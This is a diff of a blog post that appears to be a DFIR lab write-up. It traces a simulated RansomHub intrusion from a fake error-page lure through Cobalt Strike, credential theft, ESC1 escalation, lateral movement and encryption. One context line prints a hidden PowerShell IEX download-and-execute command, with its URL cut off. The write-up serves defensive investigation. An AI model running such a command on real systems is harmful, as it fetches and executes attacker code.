@@ -2,18 +2,17 @@
 title: "ELK-RansomHub"
 date: 2026-04-23
 draft: false
-summary: "An attacker breached Maromalix Corporation's network by placing a fake browser error message on their public website, tricking a user into executing a fileless Cobalt Strike stager hidden in DNS TXT records. The attacker mapped the domain, exploited CVE-2025-24071 via a malicious .library-ms file to steal credentials, and performed an AD CS ESC1 attack for privilege escalation. After moving laterally with smbexec and evading the SIEM, they deployed the RansomHub payload to exfiltrate and encrypt sensitive data."
+summary: "An attacker breached Maromalix Corporation's network by placing a fake browser error message on their public website, tricking a user into executing a Cobalt Strike stager hidden in DNS TXT records. The attacker mapped the domain, exploited CVE-2025-24071 via a malicious .library-ms file to steal credentials, and performed an AD CS ESC1 attack for privilege escalation. After moving laterally with smbexec and evading the SIEM, they deployed the RansomHub payload to exfiltrate and encrypt sensitive data."
 tags:
-  - Malware Analysis
-  - Network Analysis
   - ELK
   - SOC
   - SIEM
   - DFIR
+  - Malware Analysis
+  - Network Analysis
   - Ransomware
   - RansomHub
   - Cobalt Strike
-  - Fileless Malware
   - Process Injection
   - PowerShell
   - Active Directory
@@ -29,7 +28,7 @@ tags:
 
 On the morning of March 22, 2026, Maromalix Corporation suffered a targeted ransomware attack. The threat actor initially compromised the public-facing website, displaying a fake error message that convinced a user omar.hassan to execute a malicious command. This fetched a *Cobalt Strike* beacon hidden in DNS records. The attacker dropped SharpHound and Certify to enumerate AD CS. They then exploited **CVE-2025-24071** using a malicious *.library-ms* file on network shares to steal credentials. The attacker escalated privileges via an **ESC1** certificate attack, impersonating a high-privileged account mohamed.elfeky. Moving laterally using *smbexec.py*, the attacker temporarily disabled logging services , cleared event logs, and deployed the **RansomHub** payload.
 
-### <span style="color:red">Stage 0: Initial Access</span>
+### <span style="color:red">Initial Access</span>
 
 #### Fake Error Message and Execution
 
@@ -48,7 +47,7 @@ powershell  -nop -w hidden -c IEX((new-object net.webclient).downloadstring('htt
 
 ![alt text](image2.png)
 
-### <span style="color:red">Stage 1: Cobalt Strike beacon</span>
+### <span style="color:red">Cobalt Strike beacon</span>
 
 #### Stager Decode
 The content of `a` was captured in event id 4104. We see a long base64 line.
@@ -149,7 +148,7 @@ It uses a host header with value **fonts.googleapis.com**. Also as we see from t
 ...truncated...
 ```
 
-### <span style="color:red">Stage 2: Post-Exploitation</span>
+### <span style="color:red">Post-Exploitation</span>
 #### Persistence
 There was no malicious activity before 18:49. 
 ![alt text](image-5.png)
@@ -212,7 +211,7 @@ I checked who had accessed this file:
 * ahmed.farouk
 ![alt text](image-14.png)
 
-### <span style="color:red">Stage 3: Privilege escalation</span>
+### <span style="color:red">Privilege escalation</span>
 
 #### ESC1 attack
 Knowing about possible ESC attacks, I first of all started looking for a certificate request, which identifies ESC1. I found that at 19:46 user khaled.ibrahim requested a certificate with:
@@ -238,7 +237,7 @@ After that the user authenticated to four machines almost simultaneously.
 
 ![alt text](image-17.png)
 
-### <span style="color:red">Stage 4: Lateral Movement</span>
+### <span style="color:red">Lateral Movement</span>
 
 #### Logs services` stopping
 
@@ -279,7 +278,7 @@ Also, I decided to check Windows Defender logs at compromised machines and I fou
 This payload was caught, quarantined, and identified by Windows Defender locally on WKSTN-03 as `Trojan:MSIL/Lazy.BAC!MTB`. So, on this specific host, it didn't execute.
 ![alt text](image-21.png)
 
-### <span style="color:red">Stage 5: Ransomware analysis</span>
+### <span style="color:red">Ransomware analysis</span>
 
 #### Static Analysis
 I used a script for dumping quarantined files from windows defender and I got a ransomware binary.
